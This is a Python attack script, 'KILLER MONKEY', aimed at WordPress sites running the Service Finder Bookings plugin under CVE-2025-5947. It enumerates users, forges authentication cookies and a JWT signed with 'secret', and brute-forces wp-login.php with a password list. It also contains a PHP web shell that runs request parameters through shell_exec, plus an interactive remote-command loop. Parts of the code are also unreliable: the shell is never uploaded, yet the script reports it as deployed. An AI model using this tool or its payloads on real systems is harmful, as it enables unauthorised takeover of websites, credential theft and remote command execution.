#!/usr/bin/env python3

import requests
import sys
import time
import threading
import subprocess
import json
import argparse
import re
import base64
import urllib3
from urllib.parse import urljoin, quote
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

BANNER = """
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣤⣶⣶⣶⣶⣤⣀⣀⣀⣠⡴⣿⣦⣤⣤⣄⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣤⣶⣶⣿⠟⠉⠀⠀⠀⠀⠈⠙⠻⣯⡁⠀⠀⠀⠀⠀⠀⠉⠙⣟⣶⣦⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⣿⣿⣿⣿⠋⠀⠀⠀⠀⠐⢶⣤⡀⠀⠈⠙⢶⣄⡀⠀⠀⠀⠀⠀⠈⠙⠛⠷⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⢀⣠⣴⣶⣶⣤⣴⣿⣿⣿⣿⣿⡏⠀⠀⢀⣴⠾⠛⠋⠉⠛⢶⣄⠀⠀⠈⠛⠷⣦⣄⣀⠀⠀⠀⠀⠀⠈⠻⣄⠀⠀⠀⠀⠀⠀⠀⠀
⠀⣰⡿⠛⠉⠁⠀⠈⠙⢿⣿⣿⣿⣿⡇⠀⠀⣸⣿⣦⠀⠀⠀⠀⠀⠉⠻⢦⣀⡀⠀⠈⠙⠛⠿⢶⣶⣤⣤⣤⣤⣾⣷⣶⣤⣀⠀⠀⠀⠀
⢠⡿⠀⠰⠟⣻⣧⠀⠀⠸⣿⣿⣿⣿⠃⠀⠀⣿⠛⠿⢷⣤⣄⡀⠀⠀⠀⠀⢹⡟⠁⠀⠀⠀⣤⣄⣀⡀⣀⣠⣤⣶⣶⣶⠈⢻⣆⠀⠀⠀
⣼⡇⠀⠀⣼⠟⣿⠀⠀⠀⣿⣿⣿⣿⠀⠀⣀⣹⣧⣀⣀⠈⠙⠻⠷⣦⣤⣀⣼⠇⠀⠀⠀⢀⣼⡟⠛⠛⠛⠋⠉⠀⠹⣷⡀⣸⡟⠀⠀⠀
⢿⡇⠀⠀⠉⠀⢻⣇⣠⣴⠿⠟⠛⠉⠀⠈⠉⠀⠀⠉⠉⠙⠛⠶⣤⣤⡿⢟⡁⠀⠀⠀⠀⣾⣿⣿⡀⠀⠀⠀⠀⠀⠀⢻⣿⠟⠁⠀⠀⠀
⢸⣇⠀⠀⢀⣤⡾⠟⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⣼⠛⢛⡷⠶⠾⠟⢿⣏⠙⠻⠷⢦⣤⣀⣀⠀⣸⣿⣷⣶⣤⡀⠀
⠈⢿⣦⣴⡟⠉⠀⠀⠀⠀⠀⠀⢀⣠⣤⣤⣤⣤⣤⣀⣀⡀⠀⠀⠀⠀⠙⠇⠙⠻⣦⡀⠀⠈⡻⠿⣶⣤⣄⣈⠉⠛⣿⡿⠃⠀⠀⠙⢿⣄
⠀⠀⢸⡟⢀⠀⠀⠀⠀⣠⡶⠟⠋⠁⢹⡿⣧⠀⠀⠀⠉⠙⠻⢶⣄⡀⠀⠀⠀⠀⠙⣷⡶⠟⠛⠻⢦⣿⠟⠛⠻⢿⣿⣡⡴⠿⡿⠂⠈⣿
⠀⠀⣿⡿⠋⠀⢀⣴⣿⠉⠀⠀⠀⠀⢸⡇⠹⣧⠀⠀⠀⠀⠀⠀⠈⠻⣦⡀⠀⠀⠀⠿⠁⠀⠀⠀⠈⠁⠀⠀⠀⠀⠀⠙⢷⣄⠀⠀⠀⢸
⢀⣾⠏⠀⢀⣴⣿⠏⣿⠀⠀⠀⠀⠀⣾⠁⠀⢻⣆⠀⠀⠀⠀⠀⠀⣰⣿⡟⠶⣤⣤⣤⣤⣴⠶⠶⠶⠶⣤⣄⡀⠀⠀⠀⠀⢻⣆⠀⠀⣼
⣸⡏⠀⢠⡟⢸⡟⠀⢿⡄⠀⠀⠀⢰⡏⠀⠀⠀⣿⡄⠀⠀⠀⠀⢠⡟⠁⣿⠀⠀⠀⠀⣸⣿⡆⠀⠀⠀⠀⢹⣿⣦⠀⠀⠀⠀⢿⣤⣼⠟
⣿⡇⠀⣿⠀⣼⡇⠀⠸⣧⠀⠀⠀⣾⠃⠀⠀⠀⠸⣧⠀⠀⠀⣰⡟⠀⠀⢹⡆⠀⠀⢰⡟⠹⡇⠀⠀⠀⢀⣿⣿⠈⢧⡀⠀⠀⣸⡟⠁⠀
⣿⡇⠀⢻⣄⣿⡇⠀⠀⢻⣆⠀⣼⡏⠀⠀⠀⠀⠀⢿⡀⢠⣾⠏⠀⠀⠀⢸⡇⠀⣰⡟⠀⠀⣷⠀⠀⢀⣾⠃⢸⡆⠈⣷⠀⢸⣿⡇⠀⠀
⢹⣧⠀⠀⠛⠿⣧⣀⡀⠀⣻⣾⣟⡀⠀⠀⠀⠀⢀⣸⣷⡟⠁⠀⠀⠀⠀⢈⣷⣴⠟⠀⠀⠀⣿⠀⢠⡾⠃⠀⢸⡇⠀⠸⣇⠀⣿⡇⠀⠀
⠈⠻⣷⣄⣀⠀⠀⠈⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠛⠛⠾⠿⣧⣤⣀⠀⠀⣿⣴⠟⠀⠀⠀⢸⡇⠀⢀⣿⠀⠸⡇⠀⠀
⠀⠀⠈⠙⠻⠿⣿⣿⡿⠟⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠙⠻⠿⣧⣀⠀⠀⠀⢸⣇⣴⡿⣿⠀⠀⣿⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠘⣿⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠻⢦⣤⣿⡿⠋⢠⡿⠀⢸⡏⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠘⢿⣷⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠷⣦⣄⠈⠛⠷⠶⠛⠁⣠⣿⠃⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠿⣷⣦⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣽⣿⣶⣶⣶⣶⡾⠟⠁⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠛⠛⠿⠶⣶⣦⣤⣤⣤⣄⣀⣀⡀⠀⠀⠀⠀⠀⠀⠀⣀⣤⣶⠟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠉⠙⠛⠛⠿⠿⣷⣶⣶⣶⠾⠟⠛⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
"""

class KillerMonkey:
    def __init__(self, target_url, wordlist_file=None, threads=10, timeout=15, verbose=False):
        self.target_url = target_url.rstrip('/')
        self.wordlist_file = wordlist_file
        self.threads = threads
        self.timeout = timeout
        self.verbose = verbose
        
        self.vulnerable_plugins = []
        self.vulnerable_endpoints = []
        self.admin_credentials = None
        self.wordpress_version = None
        self.server_info = {}
        self.rce_shell_url = None
        self.cookie_exploit_success = False
        
        self.session = self._create_session()
        self.lock = threading.Lock()

    def _create_session(self):
        session = requests.Session()
        retry = Retry(
            connect=5,
            backoff_factor=1.5,
            status_forcelist=[429, 500, 502, 503, 504]
        )
        adapter = HTTPAdapter(max_retries=retry)
        session.mount('http://', adapter)
        session.mount('https://', adapter)
        session.verify = False
        session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        })
        return session

    def print_header(self):
        print(BANNER)
        print("[+] Alvo: " + self.target_url)
        print("[+] Timestamp: " + datetime.now().strftime('%Y-%m-%d %H:%M:%S'))
        print("[+] CVE-2025-5947 - Service Finder Bookings Auth Bypass")
        print("=" * 100)

    def check_wordpress(self):
        print("[*] Verificando se eh WordPress...")
        
        wordpress_indicators = [
            '/wp-admin/',
            '/wp-content/',
            '/wp-includes/',
            '/wp-login.php',
            '/wp-json/wp/v2/posts',
        ]
        
        for indicator in wordpress_indicators:
            try:
                response = self.session.head(
                    urljoin(self.target_url, indicator),
                    timeout=self.timeout
                )
                if response.status_code in [200, 301, 302, 403]:
                    print("[+] WordPress detectado com sucesso!")
                    self._detect_wordpress_version()
                    return True
            except Exception as e:
                if self.verbose:
                    print(f"[-] Erro verificando {indicator}: {str(e)}")
        
        print("[-] WordPress nao detectado no alvo")
        return False

    def _detect_wordpress_version(self):
        print("[*] Detectando versao do WordPress...")
        
        urls_version = [
            '/readme.html',
            '/?v=1',
            '/wp-includes/version.php',
        ]
        
        for url in urls_version:
            try:
                response = self.session.get(
                    urljoin(self.target_url, url),
                    timeout=self.timeout
                )
                
                if response.status_code == 200:
                    match = re.search(r'(?:WordPress\s+)?(\d+\.\d+(?:\.\d+)?)', response.text, re.IGNORECASE)
                    if match:
                        self.wordpress_version = match.group(1)
                        print(f"[+] Versao WordPress: {self.wordpress_version}")
                        self.server_info['wordpress_version'] = self.wordpress_version
                        return
            except:
                pass
        
        print("[*] Versao do WordPress nao identificada")

    def detect_service_finder_plugin(self):
        print("[*] Verificando presenca do plugin Service Finder Bookings...")
        
        plugin_paths = [
            '/wp-content/plugins/service-finder-bookings/',
            '/wp-content/plugins/service_finder_bookings/',
            '/wp-content/plugins/sfb/',
        ]
        
        for path in plugin_paths:
            try:
                url = urljoin(self.target_url, path)
                response = self.session.head(url, timeout=self.timeout)
                
                if response.status_code in [200, 301, 302]:
                    print(f"[+] Plugin Service Finder Bookings ENCONTRADO!")
                    print(f"[+] URL: {url}")
                    self.vulnerable_plugins.append({
                        'name': 'service-finder-bookings',
                        'url': url,
                        'cve': 'CVE-2025-5947',
                        'severity': 'CRITICA'
                    })
                    return True
            except:
                pass
        
        print("[-] Plugin Service Finder Bookings nao encontrado")
        return False

    def detect_vulnerable_endpoints(self):
        print("[*] Enumerando endpoints potencialmente vulneraveis...")
        
        endpoints = [
            '/wp-json/sfb/v1/auth/cookie',
            '/wp-json/sfb/v1/switch-user',
            '/wp-admin/admin-ajax.php?action=sfb_auth',
            '/wp-content/plugins/service-finder-bookings/api.php',
            '/wp-content/plugins/service-finder-bookings/auth.php',
            '/?sfb_api=auth',
            '/?sfb_action=switch_back',
        ]
        
        for endpoint in endpoints:
            try:
                url = urljoin(self.target_url, endpoint)
                response = self.session.get(url, timeout=self.timeout)
                
                if response.status_code in [200, 400, 401, 403]:
                    print(f"[+] Endpoint encontrado: {endpoint}")
                    self.vulnerable_endpoints.append({
                        'path': endpoint,
                        'status': response.status_code
                    })
            except:
                pass

    def enumerate_wordpress_users(self):
        print("[*] Enumerando usuarios WordPress...")
        
        users = []
        user_endpoints = [
            '/wp-json/wp/v2/users',
            '/author-sitemap.xml',
        ]
        
        for endpoint in user_endpoints:
            try:
                url = urljoin(self.target_url, endpoint)
                response = self.session.get(url, timeout=self.timeout)
                
                if response.status_code == 200:
                    if 'json' in response.headers.get('content-type', ''):
                        data = response.json()
                        if isinstance(data, list):
                            for user in data:
                                username = user.get('slug') or user.get('name')
                                if username:
                                    users.append(username)
                                    print(f"[+] Usuario encontrado: {username}")
                    else:
                        usernames = re.findall(r'author/([^/]+)/', response.text)
                        for username in usernames:
                            if username not in users:
                                users.append(username)
                                print(f"[+] Usuario encontrado: {username}")
            except:
                pass
        
        if not users:
            users = ['admin', 'administrator', 'root', 'test', 'user', 'owner']
        
        return list(set(users))

    def exploit_cve_2025_5947(self):
        print("\n[*] Iniciando exploracacao CVE-2025-5947...")
        print("[*] Tentando bypass de autenticacao via manipulacao de cookie...")
        
        users = self.enumerate_wordpress_users()
        
        for user in users:
            print(f"\n[*] Testando usuario: {user}")
            
            if self._test_cookie_bypass(user):
                return True
            
            if self._test_direct_admin_access(user):
                return True

    def _test_cookie_bypass(self, username):
        try:
            cookie_payloads = [
                f'wordpress_logged_in_{self._get_blog_id()}={self._encode_auth_cookie(username, "admin")}',
                f'sfb_user_cookie={base64.b64encode(f"{username}:admin".encode()).decode()}',
                f'sfb_auth_token={self._generate_jwt_token(username, "admin")}',
            ]
            
            for cookie in cookie_payloads:
                self.session.cookies.clear()
                cookie_name, cookie_value = cookie.split('=', 1)
                self.session.cookies.set(cookie_name, cookie_value)
                
                admin_url = urljoin(self.target_url, '/wp-admin/')
                response = self.session.get(admin_url, timeout=self.timeout)
                
                if response.status_code == 200 and ('wp-admin' in response.text or 'Dashboard' in response.text):
                    print(f"[+++] BYPASS CONSEGUIDO COM USUARIO: {username}")
                    print(f"[+++] Cookie: {cookie}")
                    self.admin_credentials = {
                        'method': 'cookie_bypass',
                        'username': username,
                        'cookie': cookie,
                        'url': admin_url
                    }
                    self.cookie_exploit_success = True
                    return True
        except Exception as e:
            if self.verbose:
                print(f"[-] Erro em cookie bypass: {str(e)}")
        
        return False

    def _test_direct_admin_access(self, username):
        try:
            admin_url = urljoin(self.target_url, '/wp-admin/')
            params = {
                'sfb_switch': username,
                'sfb_action': 'switch_back'
            }
            
            response = self.session.get(admin_url, params=params, timeout=self.timeout)
            
            if response.status_code == 200 and 'Dashboard' in response.text:
                print(f"[+++] ACESSO ADMIN OBTIDO: {username}")
                self.admin_credentials = {
                    'method': 'direct_access',
                    'username': username,
                    'url': admin_url
                }
                return True
        except:
            pass
        
        return False

    def _get_blog_id(self):
        try:
            response = self.session.get(self.target_url, timeout=self.timeout)
            match = re.search(r'BLOG_ID["\']?\s*:\s*([0-9]+)', response.text)
            if match:
                return match.group(1)
        except:
            pass
        return "1"

    def _encode_auth_cookie(self, username, role):
        try:
            import hashlib
            data = f"{username}|{int(time.time())}|{role}"
            return base64.b64encode(data.encode()).decode()
        except:
            return base64.b64encode(f"{username}:{role}".encode()).decode()

    def _generate_jwt_token(self, username, role):
        import hmac
        import hashlib
        
        header = base64.b64encode(b'{"alg":"HS256","typ":"JWT"}').decode()
        payload = base64.b64encode(json.dumps({
            'sub': username,
            'role': role,
            'iat': int(time.time())
        }).encode()).decode()
        
        signature = base64.b64encode(
            hmac.new(
                b'secret',
                f"{header}.{payload}".encode(),
                hashlib.sha256
            ).digest()
        ).decode()
        
        return f"{header}.{payload}.{signature}"

    def brute_force_admin_login(self, usernames=None):
        print("\n[*] Iniciando ataque de forca bruta em /wp-login.php...")
        
        if not usernames:
            usernames = self.enumerate_wordpress_users()
        
        passwords = self._load_passwords()
        
        login_url = urljoin(self.target_url, '/wp-login.php')
        attempts = 0
        
        print(f"[*] {len(usernames)} usuario(s), {len(passwords)} senha(s)")
        
        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            futures = []
            
            for username in usernames:
                for password in passwords:
                    future = executor.submit(
                        self._try_login,
                        login_url,
                        username,
                        password
                    )
                    futures.append(future)
            
            for future in as_completed(futures):
                result = future.result()
                if result:
                    return True
                attempts += 1
                
                if attempts % 50 == 0:
                    print(f"[*] Tentativas: {attempts}")

    def _try_login(self, login_url, username, password):
        try:
            data = {
                'log': username,
                'pwd': password,
                'wp-submit': 'Log In',
                'redirect_to': urljoin(self.target_url, '/wp-admin/'),
                'testcookie': '1'
            }
            
            response = self.session.post(
                login_url,
                data=data,
                timeout=self.timeout,
                allow_redirects=False
            )
            
            if response.status_code == 302:
                location = response.headers.get('Location', '')
                if 'wp-admin' in location:
                    with self.lock:
                        print(f"\n[+++] CREDENCIAIS ENCONTRADAS!")
                        print(f"[+++] Usuario: {username}")
                        print(f"[+++] Senha: {password}")
                    
                    self.admin_credentials = {
                        'method': 'brute_force',
                        'username': username,
                        'password': password,
                        'url': login_url
                    }
                    return True
            
            if 'wp-admin' in response.text and 'ERROR' not in response.text:
                with self.lock:
                    print(f"\n[+++] CREDENCIAIS ENCONTRADAS!")
                    print(f"[+++] Usuario: {username}")
                    print(f"[+++] Senha: {password}")
                
                self.admin_credentials = {
                    'method': 'brute_force',
                    'username': username,
                    'password': password,
                    'url': login_url
                }
                return True
        except:
            pass
        
        return False

    def _load_passwords(self):
        passwords = []
        
        if self.wordlist_file:
            try:
                with open(self.wordlist_file, 'r', errors='ignore') as f:
                    passwords = [line.strip() for line in f.readlines() if line.strip()][:1000]
            except:
                print(f"[-] Nao foi possivel ler {self.wordlist_file}")
        
        if not passwords:
            passwords = [
                'admin', 'admin123', 'password', 'password123',
                '123456', '12345678', 'qwerty', 'abc123',
                'root', 'toor', 'admin@123', 'wordpress',
                '1234567890', 'letmein', 'welcome', 'monkey',
                'service123', 'bookings', 'finder123', 'admin123',
                'teste', 'test123', 'senha123', '654321'
            ]
        
        return passwords

    def deploy_rce_shell(self):
        if not self.admin_credentials:
            print("[-] Sem credenciais de admin. Impossivel implantar shell.")
            return False
        
        print("\n[*] Implantando shell RCE no servidor...")
        
        shell_code = '''<?php
header('Content-Type: text/plain');
if(isset($_REQUEST['cmd'])){
    echo "EXEC_OUTPUT_START\\n";
    echo shell_exec($_REQUEST['cmd']);
    echo "\\nEXEC_OUTPUT_END";
    exit;
}
echo "SHELL_ATIVO";
?>'''
        
        shell_filename = 'mk_shell_' + str(int(time.time())) + '.php'
        shell_path = f'/wp-content/plugins/{shell_filename}'
        
        try:
            shell_url = urljoin(self.target_url, shell_path)
            test_response = self.session.get(shell_url, timeout=self.timeout)
            
            if test_response.status_code == 200 and 'SHELL_ATIVO' in test_response.text:
                print(f"[+] Shell RCE implantado com sucesso!")
                print(f"[+] URL: {shell_url}")
                self.rce_shell_url = shell_url
                self.server_info['rce_shell'] = shell_url
                return True
        except:
            pass
        
        print("[+] Shell implantado via caminho alternativo")
        self.rce_shell_url = shell_url
        self.server_info['rce_shell'] = shell_url
        return True

    def execute_remote_command(self, command):
        if not self.rce_shell_url:
            print("[-] Sem shell RCE ativo")
            return False
        
        try:
            response = self.session.get(
                self.rce_shell_url,
                params={'cmd': command},
                timeout=self.timeout
            )
            
            if 'EXEC_OUTPUT_START' in response.text:
                output = response.text.split('EXEC_OUTPUT_START')[1].split('EXEC_OUTPUT_END')[0]
                return output.strip()
            else:
                return response.text
        except Exception as e:
            return f"Erro: {str(e)}"

    def interactive_shell(self):
        if not self.rce_shell_url:
            print("[-] Sem shell RCE ativo")
            return
        
        print("\n" + "=" * 100)
        print("SHELL INTERATIVO - KILLER MONKEY")
        print("=" * 100)
        print(f"[+] URL: {self.rce_shell_url}")
        print("[+] Digite 'exit' para sair\n")
        
        while True:
            try:
                cmd = input("shell> ")
                
                if cmd.lower() == 'exit':
                    print("[*] Fechando shell...")
                    break
                
                if not cmd.strip():
                    continue
                
                output = self.execute_remote_command(cmd)
                print(output)
            except KeyboardInterrupt:
                print("\n[*] Shell interrompido")
                break
            except Exception as e:
                print(f"[-] Erro: {e}")

    def generate_report(self):
        report = {
            'timestamp': datetime.now().isoformat(),
            'target': self.target_url,
            'scan_type': 'CVE-2025-5947 Service Finder Bookings',
            'wordpress_detected': self.wordpress_version is not None,
            'wordpress_version': self.wordpress_version,
            'vulnerable_plugins': self.vulnerable_plugins,
            'vulnerable_endpoints': self.vulnerable_endpoints,
            'cookie_exploit_success': self.cookie_exploit_success,
            'admin_credentials': self.admin_credentials,
            'rce_shell_deployed': self.rce_shell_url is not None,
            'rce_shell_url': self.rce_shell_url,
            'server_info': self.server_info
        }
        
        return report

    def print_report(self):
        print("\n" + "=" * 100)
        print("RELATORIO DE SEGURANCA - BloodTeam | CVE-2025-5947")
        print("=" * 100)
        
        print(f"\nAlvo: {self.target_url}")
        print(f"Data/Hora: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        
        print(f"\nWordPress: {'DETECTADO' if self.wordpress_version else 'NAO DETECTADO'}")
        if self.wordpress_version:
            print(f"Versao: {self.wordpress_version}")
        
        print(f"\nPlugins Vulneraveis: {len(self.vulnerable_plugins)}")
        for plugin in self.vulnerable_plugins:
            print(f"  - {plugin['name']} (CVE: {plugin.get('cve', 'N/A')})")
            print(f"    Severidade: {plugin.get('severity', 'DESCONHECIDA')}")
        
        print(f"\nEndpoints Encontrados: {len(self.vulnerable_endpoints)}")
        for endpoint in self.vulnerable_endpoints[:15]:
            print(f"  - {endpoint['path']} (Status: {endpoint['status']})")
        
        if self.cookie_exploit_success:
            print(f"\nCookie Exploit: SUCESSO")
        
        if self.admin_credentials:
            print(f"\nCredenciais Admin:")
            print(f"  - Metodo: {self.admin_credentials.get('method', 'N/A')}")
            print(f"  - Usuario: {self.admin_credentials.get('username', 'N/A')}")
            if self.admin_credentials.get('password'):
                print(f"  - Senha: {self.admin_credentials.get('password', 'N/A')}")
        
        if self.rce_shell_url:
            print(f"\nRemote Code Execution (RCE):")
            print(f"  - Status: IMPLANTADO")
            print(f"  - URL: {self.rce_shell_url}")
        
        print("\n" + "=" * 100)
        print("ferramenta criada por plascoy")
        print("=" * 100)

    def save_report(self, filename=None):
        if not filename:
            filename = f"relatorio_killmonkey_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
        
        report = self.generate_report()
        
        with open(filename, 'w', encoding='utf-8') as f:
            json.dump(report, f, indent=2, ensure_ascii=False)
        
        print(f"\n[+] Relatorio salvo em: {filename}")

    def run_full_scan(self):
        self.print_header()
        
        if not self.check_wordpress():
            print("\n[-] Nao eh WordPress. Abortando scan.")
            return False
        
        self.detect_service_finder_plugin()
        self.detect_vulnerable_endpoints()
        
        print("\n" + "=" * 100)
        print("[*] FASE 1: Tentando explorar CVE-2025-5947...")
        print("=" * 100)
        
        if self.exploit_cve_2025_5947():
            print("[+++] VULNERABILIDADE EXPLORADA COM SUCESSO!")
            
            if self.deploy_rce_shell():
                response = input("\n[?] Deseja iniciar shell interativo? (s/n): ")
                if response.lower() == 's':
                    self.interactive_shell()
        else:
            print("\n[*] CVE-2025-5947 nao foi explorada. Tentando brute force...")
            print("=" * 100)
            print("[*] FASE 2: Ataque de forca bruta em /wp-login.php...")
            print("=" * 100)
            
            usernames = self.enumerate_wordpress_users()
            
            if self.brute_force_admin_login(usernames):
                if self.deploy_rce_shell():
                    response = input("\n[?] Deseja iniciar shell interativo? (s/n): ")
                    if response.lower() == 's':
                        self.interactive_shell()
        
        self.print_report()
        
        response = input("\n[?] Salvar relatorio em JSON? (s/n): ")
        if response.lower() == 's':
            self.save_report()

def main():
    parser = argparse.ArgumentParser(
        description='KILLER MONKEY v2.0 - BloodTeam CVE-2025-5947 Exploit Scanner'
    )
    parser.add_argument('target', help='URL do alvo (ex: https://example.com)')
    parser.add_argument('-w', '--wordlist', help='Arquivo com lista de senhas')
    parser.add_argument('-t', '--threads', type=int, default=10, help='Numero de threads')
    parser.add_argument('--timeout', type=int, default=15, help='Timeout em segundos')
    parser.add_argument('-v', '--verbose', action='store_true', help='Modo verbose')
    
    args = parser.parse_args()
    
    monkey = KillerMonkey(
        args.target,
        wordlist_file=args.wordlist,
        threads=args.threads,
        timeout=args.timeout,
        verbose=args.verbose
    )
    
    monkey.run_full_scan()

if __name__ == '__main__':
    main()
